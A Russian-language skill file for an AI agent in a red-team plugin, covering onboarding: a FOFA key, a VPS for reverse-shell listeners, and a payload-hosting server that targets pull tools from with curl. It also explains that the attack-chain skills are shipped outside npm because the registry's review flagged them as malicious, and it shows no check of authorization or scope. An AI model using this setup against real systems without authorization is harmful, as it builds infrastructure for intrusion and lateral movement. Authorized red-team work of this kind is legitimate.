# Первый запуск (настроить среду за один раз)

**Условия срабатывания** (при любом из них выполняйте навык, не пропускайте):
- в ответе `redteam_preflight` `onboarding.complete=false`;
- в preflight есть `broken`-навыки с причиной «нет переменной окружения» или «VPS всё ещё заглушка»;
- пользователь впервые входит в режим red team или прямо говорит «среда/инструменты не настроены».

**Основной принцип**: **сказать всё сразу и попросить всё за один раз**. Не выпрашивать данные порциями по кругу — это единственная причина, по которой такой онбординг существует.

## 1. Сначала проверьте наличие «toolbox» (в npm-версии его по умолчанию нет)

npm-версия `dsh-redteam-mode` **не поставляет в пакете скрипт установки инструментов и 9 навыков цепочек атаки** (туннели / учётные данные /
WebShell / reverse shell / латеральное перемещение / эксплуатация без авторизации). Причина: автоматическая проверка при публикации в npm считает
«пакет после установки автоматически скачивает пентест-бинарники» признаком вредоносного поведения, и весь пакет блокируется.

- **Есть** `$DSH_HOME/redteam/setup.sh` (toolbox получен самостоятельно или установка не из npm) → идите по разделам 1 и 2 ниже;
- **Нет** (в ответе `redteam_preflight` `onboarding.setup_script.exists=false`) → сначала скачайте с GitHub Release проекта
  `dsh-redteam-mode-<версия>-toolkit.tar.gz`, распакуйте и по README внутри
  **выполняйте сами** (это делает пользователь), затем в разделе 3 вручную настройте `FOFA_KEY` и VPS;
- Можно **обойтись без всего этого**: только 14 навыков разведки и обнаружения из этого пакета (`fofa-recon` / `active-scan` /
  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` и др.) — работать можно, но результаты, требующие закрепления на цели, будут недоступны.

> **Красная линия**: этот плагин **не скачивает и не устанавливает за пользователя никакие security-инструменты**. Если что-то нужно — укажите, где взять, а пользователь получает и запускает сам.

## 2. Что нужно от пользователя (перечислить сразу, объяснив «зачем» и «куда»)

| Что нужно | Зачем обязательно | Куда | Что будет без этого |
| --- | --- | --- | --- |
| **FOFA_KEY** | На нём держится картирование активов (`fofa-recon`) — разворот интернет-поверхности организации; без него остаются только crt.sh + перечисление поддоменов, **периферийные и незарегистрированные активы массово теряются** | Переменная окружения `FOFA_KEY` либо запись в `$DSH_HOME/.env` (скрипт запишет сам) | Картирование деградирует: активы находятся не полностью → страдают все четыре следующих этапа |
| **Способ входа на VPS** (`user@ip` + путь к приватному ключу) | Reverse shell должен приходить на **контролируемый из интернета хост**; на этом же держатся доставка payload и транзит туннелей | `REDTEAM_VPS_HOST` (`пользователь@хост`) / `REDTEAM_VPS_KEY` (путь к приватному ключу, по умолчанию `$DSH_HOME/redteam/toolkit/vps/id_rsa`) | Нет прав на сервере, нельзя доставить payload, нельзя войти во внутреннюю сеть |
| (необязательно) key платформ картирования | Результаты Quake / Hunter / ZoomEye сильно отличаются от FOFA, пересечение даёт больше активов | Переменная окружения, по необходимости | Меньше перекрёстной проверки |
| (необязательно) разрешение на apt | Доустановка системных инструментов | Пользователь сам выполняет `sudo apt install …` | Соответствующие навыки деградируют |

**Как формулировать**: перечислив, **дождитесь, пока пользователь всё дополнит**. Не отговаривайтесь «начну в урезанном режиме» — если только пользователь прямо не сказал «работай на текущих условиях».

**Внимание**: key пользователя **не пишите в репозиторий, не вставляйте в отчёт и не допускайте в поле `tool` у `redteam_chain_add`**.
Достаточно записать в `$DSH_HOME/.env` (скрипт уже ставит `chmod 600`).

### Как получить FOFA_KEY (нужно уметь объяснить пользователю)
1. Войдите на <https://fofa.info> → аватар в правом верхнем углу → **личный кабинет → API Key**;
2. Лимиты персонального тарифа: 10,000 запросов/мес, 1 запрос в секунду (**скрипты и навыки ограничены 1 запросом в секунду, не повышайте**, иначе сработает блокировка 45012);
3. Получив key, проверьте его: `curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` — если вернулось `"error":false`, ключ рабочий.

### Как подготовить VPS (нужно уметь объяснить пользователю)
- Один **доступный из интернета** Linux VPS (хватит 1 ядра и 1 ГБ памяти), в security group открыть: `22` (SSH), `9000-9999` (диапазон слушателей reverse shell), `9100` (раздача payload);
- Сгенерировать или положить приватный SSH-ключ в `$DSH_HOME/redteam/toolkit/vps/id_rsa`, права обязательно `chmod 600`;
- Проверить связность: `ssh -i <ключ> <user>@<ip> 'echo ok'`;
- **Сервис раздачи payload**: каталог `~/payload` на VPS + `python3 -m http.server 9100` (постоянно в tmux),
  тогда целевая машина может забрать инструмент напрямую: `curl http://<ip>:9100/fscan`.

## 3. Проверка после настройки (без неё ввод в работу не завершён)

Проверяйте каждый пункт на практике, **не ограничивайтесь «файл существует»**:

```bash
# 1) FOFA key рабочий
curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'

# 2) VPS доступен (работает ли сервис payload, проверяет диагностический скрипт toolbox)
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'

# 3) реестр навыков виден
#    перепроверьте через redteam_preflight и посмотрите, какие навыки реально есть в списке available
```

> Проверку бинарников и библиотеки шаблонов nuclei выполняет `redteam-setup.sh --check` из toolbox
> (в npm-версии этого скрипта нет, см. раздел 1).
## 4. Последний шаг: записать отметку о завершении и перепроверить

После дополнения настроек запишите отметку о завершении (при наличии скрипта toolbox он делает это сам с `--yes`; если скрипта нет — вручную):

```bash
mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
```

Затем **прогоните `redteam_preflight` ещё раз** и убедитесь: `onboarding.complete=true`, `broken` пуст либо остались только пункты, где пользователь явно согласился на ограничения.
Итог сообщите пользователю тремя пунктами: «что работает / чего нет / к чему это приводит».

**После изменения `$DSH_HOME/.env` нужно перезапустить dsh web**, иначе текущий процесс не увидит новые переменные окружения —
об этом нужно прямо сказать пользователю (агент не может перезапустить за него).

## 5. Когда пользователь не даёт часть ресурсов (режим ограничений)

| Чего нет | Что делаем вместо | Какое ограничение обязательно сообщить |
| --- | --- | --- |
| FOFA_KEY | прозрачность сертификатов crt.sh + `passive-recon` + `recon-pipeline` (subfinder/ksubdomain/dnsx) + поисковые системы и данные регистрации | **Сбор активов неполный**: незарегистрированные и периферийные активы теряются; потолок результата снижается |
| VPS | Только результаты, не требующие закрепления (доступ к аккаунтам, данные, доступ без авторизации, передача WebShell) | **Нет прав на сервере и входа во внутреннюю сеть**, зачётные пункты `boundary`/`internal`/`central-system` практически недостижимы |
| Системные инструменты (nuclei и др.) | Замены из toolbox (httpx/subfinder на месте) | Возможности поиска уязвимостей резко падают, обнаружение Nday практически парализовано |
| Нет ничего | Только чисто пассивная разведка и инвентаризация активов | Прямо сказать пользователю: «в этот раз дойдём только до этапа разведки» |

**Решение об ограничениях должно попасть в отчёт**: пользователь должен знать, в каких условиях шла работа.
